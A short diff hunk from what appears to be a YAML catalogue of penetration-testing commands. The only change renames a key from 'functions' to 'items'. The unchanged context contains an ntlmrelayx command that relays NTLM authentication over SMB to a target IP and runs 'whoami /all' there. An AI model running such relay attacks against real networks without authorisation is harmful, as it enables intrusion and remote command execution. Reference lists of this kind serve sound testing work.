@@ -8,7 +8,7 @@ description: |
 
   	Target IP: 10.10.10.1
 
-functions:
+items:
   No_Creds:
     - code: |
         python3 ntlmrelayx.py -smb2support -t smb://10.10.10.1 -c 'whoami /all' -debug
